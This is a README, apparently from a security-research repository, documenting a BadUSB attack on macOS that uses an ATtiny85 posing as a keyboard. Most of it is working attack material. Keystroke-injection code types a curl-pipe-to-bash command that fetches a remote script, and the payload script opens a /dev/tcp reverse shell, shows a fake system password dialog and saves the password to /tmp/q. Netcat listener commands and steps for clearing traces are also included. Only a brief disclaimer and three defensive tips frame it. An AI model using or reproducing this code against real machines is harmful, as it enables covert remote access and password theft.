# BadUSB Mac Attack

This repository documents a security research project demonstrating how a modified ATtiny85 microcontroller can be used to create a BadUSB device that targets macOS systems. **This project is for educational and research purposes only**.

## Overview

This project demonstrates a social engineering attack vector using a USB device that masquerades as a regular keyboard (HID - Human Interface Device). When connected to a target Mac, it automatically:

1. Opens Terminal via Spotlight
2. Executes a curl command that downloads and runs a script from a shortened URL
3. Creates a fake authentication dialog that mimics macOS system prompts
4. Captures the user's password
5. Opens a reverse shell (backdoor) to the attacker's machine

## Components

### 1. Hardware

- ATtiny85 microcontroller programmed as a USB HID device
- Compatible with various development boards like DigiSpark

### 2. DigiKeyboard Code

```cpp
#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(250); // Wait until the USB is recognized

    // Open Terminal on macOS
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);  // ⌘ + Space (Spotlight)
    DigiKeyboard.delay(500);
    DigiKeyboard.print("Terminal");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);  // Wait until Terminal is open
   
    // Short URL
    DigiKeyboard.print("curl -sL <short_url> | bash & disown; exit");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
    // Do nothing
}
```

### 3. Payload Script

This is the content that gets downloaded and executed from the shortened URL:

```bash
osascript -e '
do shell script "bash -i >& /dev/tcp/<remote system>/8080 0>&1 &"
set userInput to (display dialog "Do not enter password:" default answer "" with hidden answer with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" with title "Security" buttons {"pwnd"} default button "pwnd")
set q to text returned of userInput
do shell script "echo " & quoted form of q & " > /tmp/q"
do shell script "clear"' & disown; exit
```

## System Setup

This attack involves two separate computer systems:

1. **Target System**: The Mac computer where the BadUSB is inserted
2. **Remote/Attacker System**: A separate computer controlled by the attacker that receives the connection and captured credentials

## How It Works

1. **Preparation**: Before the attack, the attacker sets up a listener on their remote system using `nc -lv 8080`
2. **Initial Connection**: When the BadUSB is connected to the target Mac, it is recognized as a standard keyboard
3. **Terminal Launch**: The device automatically opens Terminal via Spotlight search
4. **Payload Execution**: 
   - It types and executes a curl command that downloads the malicious script from a shortened URL
   - Using a shortened URL (https://surl.li/en) keeps the typed command brief, reducing execution time
   - The full payload is ~400 characters, which would be noticeable if typed directly
5. **Backdoor Creation**: The script establishes a reverse shell from the target Mac to the attacker's remote system (remote system IP) on port 8080
6. **Password Phishing**: A fake authentication dialog appears on the target Mac, tricking the user into entering their password
7. **Credential Theft**: The entered password is saved to `/tmp/q` on the target Mac
8. **Remote Access**: The attacker now has shell access to the target Mac via the established connection
9. **Password Retrieval**: The attacker can access the captured password by examining the `/tmp/q` file on the target Mac through the backdoor connection
10. **Terminal Cleanup**: The terminal on the target Mac is cleared to hide evidence of the attack

## Remote System Setup

Before inserting the BadUSB into the target system, the attacker must prepare their remote system:

1. Ensure the remote system is on the same network as the target will be, or has a public IP accessible to the target
2. Set up a listener to receive the reverse shell connection:

```bash
nc -lv 8080
```

3. When the BadUSB is connected to the target Mac and the script executes successfully, the attacker will automatically gain remote access to the target system through this listener
4. Once the connection is established, the attacker can view the captured password by running:

```bash
cat /tmp/q
```

This will display the password that was entered by the target user in the fake authentication dialog.

## Security Implications

This project demonstrates several security vulnerabilities:

1. **Physical Access Risks**: Even brief physical access to a system can lead to compromise
2. **Trust in USB Devices**: Systems implicitly trust connected USB devices
3. **Social Engineering**: Users may enter credentials into convincing system dialogs
4. **Shortened URLs**: They obscure the actual destination and payload content

## Defensive Measures

To protect against this type of attack:

1. Use USB data blockers for charging from untrusted sources
2. Enable USB Restricted Mode where available
3. Be suspicious of unexpected system password prompts

## Legal Disclaimer

This project is published for **educational and research purposes only**. The author do not condone the use of this software for malicious purposes. Unauthorized access to computer systems is illegal and unethical. Always obtain proper authorization before security testing.

## Contribution

Feel free to contribute to this project by submitting pull requests or opening issues for discussion.
